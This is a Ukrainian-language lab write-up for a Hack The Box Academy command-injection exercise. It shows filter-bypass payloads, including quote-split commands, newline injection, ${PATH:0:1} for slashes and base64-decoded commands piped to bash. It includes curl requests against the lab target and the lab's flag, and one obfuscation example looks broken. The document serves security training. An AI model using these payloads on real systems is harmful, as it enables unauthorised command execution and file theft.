## Command Injections — Bypassing Blacklisted Commands

**Модуль:** [Command Injections](https://academy.hackthebox.com/app/module/109)
**Секція:** [Bypassing Blacklisted Commands](https://academy.hackthebox.com/app/module/109/section/1038)
**Прапор:** `HTB{b451c_f1l73r5_w0n7_570p_m3}`

***

## Концепція

Тепер заблокована не лише `cat` команда, а й інші команди читання файлів. Фільтр шукає точний рядок `cat` у input. Bypass — **вставити лапки всередину команди**: shell ігнорує порожні лапки при виконанні, але рядок `cat` вже не існує у запиті → фільтр не спрацьовує. [kabaneridev.gitbook](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/web-application-attacks/command-injection/bypassing-blacklisted-commands)

```bash
c'a't   →  shell виконує як "cat"  →  фільтр бачить "c'a't" (не "cat") ✅
c"a"t   →  те саме з подвійними лапками ✅
c\a\t   →  backslash варіант (Linux) ✅
```

***

## Фінальний payload

```
ip=127.0.0.1%0a{c'a't,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
```

**Розбір кожної частини:**

| Частина | Що означає | Навіщо |
|---|---|---|
| `127.0.0.1` | Валідний IP | Проходить базову перевірку |
| `%0a` | New-line `\n` | Injection operator (не в blacklist) |
| `{...,...}` | Brace expansion | Замінює пробіл між командою і аргументом |
| `c'a't` | `cat` з лапками | Обходить blacklist команди `cat` |
| `${PATH:0:1}` | Перший символ `$PATH` = `/` | Обходить blacklist символу `/` |
| `home` | директорія | Частина шляху |
| `1nj3c70r` | ім'я юзера (знайдено раніше) | Частина шляху |
| `flag.txt` | файл | Ціль |
| **Сервер виконує:** | `cat /home/1nj3c70r/flag.txt` | ✅ |

***

## Команда

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TARGET="http://154.57.164.74:32673"

# Одинарні лапки обов'язкові! Інакше bash розгорне ${PATH:0:1} локально
curl -s -X POST "$TARGET/index.php" \
  --data 'ip=127.0.0.1%0a{c'"'"'a'"'"'t,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}' \
  | grep -o 'HTB{[^}]*}'
```

> **Проблема з лапками в curl:** Одинарні лапки `'...'` не дозволяють вставити `'` всередину. Трюк `'"'"'` = закрити `'`, вставити `"'"`, відкрити `'` знову.

**Простіший варіант через файл:**
```bash
# Записуємо payload у файл і передаємо через --data-binary
echo -n "ip=127.0.0.1%0a{c'a't,\${PATH:0:1}home\${PATH:0:1}1nj3c70r\${PATH:0:1}flag.txt}" \
  > /tmp/payload.txt

curl -s -X POST "$TARGET/index.php" \
  --data-binary @/tmp/payload.txt | grep -o 'HTB{[^}]*}'
# HTB{b451c_f1l73r5_w0n7_570p_m3}
```

***

## Всі методи обфускації команд

```bash
# Одинарні лапки
c'a't /home/user/flag.txt

# Подвійні лапки
c"a"t /home/user/flag.txt

# Backslash (Linux тільки)
c\a\t /home/user/flag.txt

# Змінна посередині (bash)
x=ca;t${x} /home/user/flag.txt

# Реверс команди
$(rev<<<'tac') /home/user/flag.txt

# Base64
bash<<<$(base64 -d<<<Y2F0IC9ob21lL3VzZXIvZmxhZy50eHQ=)
```

***

## Прапор

```
HTB{b451c_f1l73r5_w0n7_570p_m3}
```
